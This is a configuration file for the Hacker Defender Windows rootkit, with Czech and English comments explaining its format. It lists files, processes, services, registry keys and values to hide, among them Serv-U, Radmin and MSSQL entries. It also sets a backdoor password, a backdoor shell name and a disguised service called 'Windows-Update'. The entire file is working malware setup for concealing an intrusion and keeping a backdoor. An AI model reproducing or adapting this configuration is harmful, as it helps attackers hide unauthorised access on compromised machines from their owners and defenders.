[Hidden Table]
hxdef*
ServUCert.crt
ssleay32.dll
libeay32.dll
BugSlayerUtil.dll
ServUPerfCount.dll
dhcpsr.exe
AdmDll.dll
raddrv.dll
netdefw.exe
DHCPSR.log
Filter.dll
Filter.ini
JAsfv.dll
JAsfv.ini

[Root Processes]
hxdef*
dhcpsr.exe
netdefw.exe
netddefw.exe
crc.exe
netde.exe

[Hidden Services]
HackerDefender*
DHCPSR
DHCP-Server
WinUp
Windows-Update
Netzwerk-DDE-Firewall
NetDDEFW
Remote Administrator*
Firedaemon*
MSSQL
r_server

[Hidden RegKeys]
HackerDefender073
LEGACY_HACKERDEFENDER073
Serv-U
r_server
ntservice
radmin*
DHCPSR
Windows-Update
WinUp
NetDDEFW
MSSQL

[Hidden RegValues]
ntservice
radmin
r_server
Windows-Update
WinUp
NetDDEFW

[Startup Run]

[Settings]
Password=eastdev@me
BackdoorShell=hxdef�$.exe
ServiceName=WinUp
DisplayName=Windows-Update
ServiceDescription=powerful NT rootkit

[Comments]
czech>
toto je inifile pro nt rootkit 
musi po rade obsahovat dva seznamy souboru: [Hidden Table] a [Root Processes],
seznam nazvu sluzeb: [Hidden Services],
seznam nazvu klicu registru: [Hidden RegKeys],
seznam nazvu hodnot registru: [Hidden RegValues],
specialni seznam programu s parametry: [Startup Run]
a zakladni nastaveni: [Settings]
seznamy mohou byt prazdne, ale musi mit nadpisky 
seznamy jsou oddeleny prazdnym radkem
pokud jsou zde komentare, jsou nutne oddeleny prazdnym radkem od posledniho
prvku nastaveni [Settings]
[Settings] musi obsahovat pet hodnoty: Password, BackdoorShell, ServiceName, 
DisplayName a ServiceDescription

english>
this is nt rootkit inifile
it must contains two file lists: [Hidden Table] and [Root Processes],
a list of service names: [Hidden Services],
a list of registry keys: [Hidden RegKeys],
a list of registry values: [Hidden RegValues],
special list of programs with arguments: [Startup Run]
and basic settings: [Settings]
lists can be empty, but there must be the heading
lists are divided by clean line 
there must be clean line after last [Settings] item if there is comment below
[Settings] must contains five values: Password, BackdoorShell, ServiceName,
DisplayName and ServiceDescription
